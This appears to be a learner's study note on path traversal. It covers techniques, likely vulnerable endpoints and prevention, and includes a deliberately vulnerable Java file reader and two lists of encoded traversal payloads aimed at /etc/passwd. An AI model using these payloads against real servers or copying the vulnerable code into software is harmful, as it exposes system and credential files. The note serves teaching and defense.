	
# what is Path Traversal


		│
		├── Definition
		│   ├── Known as Directory Traversal
		│   └── Exploit to access arbitrary files on server
		│
		├── Impact
		│   ├── Read sensitive files
		│   │   ├── OS files (/etc/passwd, C:\windows\win.ini)
		│   │   ├── Application code (PHP, JS, configs)
		│   │   └── Credentials (DB, API keys, .env)
		│   └── Write files (in rare cases → RCE)
		│
		├── Techniques
		│   ├── Relative paths (../../etc/passwd)
		│   ├── Encoding
		│   │   ├── URL encoded (%2e%2e%2f) -> ../
		│   │   └── Double encoded (%252e%252e%252f) -> ../
		│   ├── Slash mixing (..\ , ..././, ....//....//....//etc/passwd)
		│   ├── Null byte injection (%00)
		│   └── Path truncation / symlinks
		│
		├── Common Obstacles
		│   ├── Filtering ../
		│   ├── Extension checks (.jpg)
		│   └── Blacklists
		│
		└── Prevention
		    ├── Use safe libraries (realpath, Path.resolve)
		    ├── Whitelisting files
		    ├── Canonicalization
		    └── Least privilege for file access



# source code 


	import java.io.* ;
	public class ImageServerVuln {
	    private static final String BASE_DIRECTORY = "/var/www/images";
	
	    public static void main(String[] args) throws IOException {
	        // Simulating user input
	        String userInput = args[0]; // e.g., "../../etc/passwd"
	
	        // Vulnerable: directly appending user input to base directory
	        File file = new File(BASE_DIRECTORY, userInput);
	
	        // Read file content
	        BufferedReader br = new BufferedReader(new FileReader(file));
	        String line;
	        while ((line = br.readLine()) != null) {
	            System.out.println(line);
	        }
	        br.close();
	    }
	}

# payloads
	
	1. Traversal عادي
	GET /image?filename=../../../../etc/passwd
	
	2. Absolute path + traversal
	GET /image?filename=/var/www/images/../../../etc/passwd
	 3. URL-encoding
	GET /image?filename=..%2f..%2f..%2fetc/passwd
	
	4. Double encoding
	GET /image?filename=..%252f..%252f..%252fetc/passwd
	
	 5. UTF-8 overlong encoding
	GET /image?filename=..%c0%af..%c0%af..%c0%afetc/passwd
	
	6. Unicode fullwidth slash
	GET /image?filename=..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
	
	 7.  Null byte + forced extension
	GET /image?filename=../../../etc/passwd%00.png
	

# Where to Find Path Traversal

	
	├── File download endpoints
	│   ├── /download?file=report.pdf
	│   └── /view?img=avatar.png
	│
	├── Image / Document viewers
	│   └── Upload then view images/docs via parameter
	│
	├── Export / Backup functionality
	│   └── /export?file=db_backup.zip
	│
	├── Template / Language selectors
	│   └── /page?lang=en  → loads file like lang/en.php
	│
	├── Logs / Reports access
	│   └── Downloading server logs, reports, audit files
	│
	└── Hidden APIs
	    └── Endpoints handling files (PDF viewer, config fetch)


my payload 

	- GET /view?file=/etc/passwd
	- GET /view?file=../../../../../etc/passwd
	- GET /view?file=....//....//....//....//etc/passwd
	- GET /view?file=..%252f..%252f..%252fetc/passwd -> double encoding for ( / )  with utf-8
	- GET /view?file=%2e%2e%2f%2e%2e%2fetc/passwd
	
	- validate on start like -> filename=/var/www/images/image.jpg to path it -> filename=/var/www/images/../../../etc/passwd will see in the end /etc/passwd
	


# prevent:

 
 
	├── 1. Avoid user input in filesystem APIs
	│   └── Use fixed values or IDs instead of full paths
	│
	├── 2. Validate User Input
	│   ├── Whitelist (allowed file types) → [jpg, png, gif]
	│   └── Regex → only alphanumeric characters
	|
	├── 3.  Canonicalization
	│          - File file = new File(BASE_DIRECTORY, userInput);      
	|          - if ( file.getCanonicalPath().startsWith(BASE_DIRECTORY)) 
	|          -          { // process file }
	|
	│     ─ Resolve `../`, `%2e%2e%2f`, symlinks
	│
	├── 4. Verify Path
	│   └── If (canonicalFile.startsWith(canonicalBase))
	│        ├── YES → Access file safely
	│        └── NO  → Reject + Log
	│
	├── 5. Defense in Depth
	│   ├── Use least privilege for web server
	│   ├── Restrict file permissions
	│   └── Sandbox sensitive directories
	│
	└── 6. Logging & Monitoring
	    ├── Log suspicious inputs (../../, %2f, %00)
	    └── Alert if repeated traversal attempts
